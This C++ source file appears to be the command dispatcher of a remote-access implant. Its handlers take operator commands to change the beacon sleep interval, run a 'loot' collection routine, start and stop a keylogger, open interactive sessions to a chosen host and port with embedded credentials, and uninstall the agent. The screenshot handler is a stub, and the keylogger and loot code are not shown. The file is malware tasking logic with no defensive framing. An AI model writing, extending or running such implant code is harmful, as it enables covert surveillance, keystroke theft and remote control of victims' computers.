#include "SessionManager.hpp"
#include "CommandDispatcher.hpp"

#include "Types.hpp"

#include <filesystem>
#include <stdexcept>

CommandDispatcher::CommandDispatcher(
    int& current_sleep,
    Keylogger& keylogger,
    SessionManager& sessions,
    std::atomic<bool>& running,
    std::string user,
    std::string pass) {
    handlers_.push_back(std::make_unique<TimeoutCommandHandler>(current_sleep));
    handlers_.push_back(std::make_unique<ScreenshotCommandHandler>());
    handlers_.push_back(std::make_unique<LootCommandHandler>());
    handlers_.push_back(std::make_unique<KeyloggerStartHandler>(keylogger));
    handlers_.push_back(std::make_unique<KeyloggerStopHandler>(keylogger));
    handlers_.push_back(std::make_unique<SessionCommandHandler>(sessions, user, pass));
    handlers_.push_back(std::make_unique<CloseSessionCommandHandler>(sessions));
    handlers_.push_back(std::make_unique<UninstallCommandHandler>(running));
}

CommandResult CommandDispatcher::dispatch(const CommandDAO& cmd) {
    for (const auto& handler : handlers_) {
        if (handler->can_handle(cmd.command)) {
            auto result = handler->execute(cmd.command);
            result.command_uid = cmd.uid;
            result.status = 1;
            return result;
        }
    }

    CommandResult result;
    result.command_uid = cmd.uid;
    result.result_data = "Unknown command";
    result.status = 0;
    return result;
}

CommandResult TimeoutCommandHandler::execute(std::string_view cmd) {
    CommandResult result;
    result.status = 1;
    try {
        current_sleep_ = std::stoi(std::string(cmd.substr(8)));
        result.result_data = "Sleep interval updated to " + std::to_string(current_sleep_) + "m";
    } catch (...) {
        result.status = 0;
        result.result_data = "Invalid timeout format";
    }
    return result;
}

CommandResult ScreenshotCommandHandler::execute(std::string_view) {
    CommandResult result;
    result.status = 1;
    result.result_data = "Screenshot command not implemented!";
    return result;
}

CommandResult LootCommandHandler::execute(std::string_view) {
    CommandResult result;
    result.status = 1;
    result.result_data = LootManager::execute_loot_command();
    return result;
}

CommandResult KeyloggerStartHandler::execute(std::string_view) {
    keylogger_.start();
    CommandResult result;
    result.status = 1;
    result.result_data = "Keylogger started";
    return result;
}

CommandResult KeyloggerStopHandler::execute(std::string_view) {
    keylogger_.stop();
    CommandResult result;
    result.status = 1;
    result.result_data = "Keylogger stopped";
    return result;
}

CommandResult SessionCommandHandler::execute(std::string_view cmd) {
    CommandResult result;
    result.status = 1;
    try {
        const std::string command = std::string(cmd);
        const auto space = command.find_last_of(' ');
        if (space == std::string::npos || space <= 8) {
            throw std::runtime_error("invalid session command");
        }
        const std::string host = command.substr(8, space - 8);
        const int port = std::stoi(command.substr(space + 1));
        sessions_.start_session(generate_uuid(), host, port, user_, pass_);
        result.result_data = "Interactive session requested";
    } catch (...) {
        result.status = 0;
        result.result_data = "Invalid session command";
    }
    return result;
}

CommandResult CloseSessionCommandHandler::execute(std::string_view) {
    sessions_.stop_sessions();
    CommandResult result;
    result.status = 1;
    result.result_data = "Interactive sessions closed";
    return result;
}

CommandResult UninstallCommandHandler::execute(std::string_view) {
    std::filesystem::remove(std::filesystem::current_path() / "identity.dat");
    running_ = false;
    CommandResult result;
    result.status = 1;
    result.result_data = "Agent uninstalled. Process exiting.";
    return result;
}
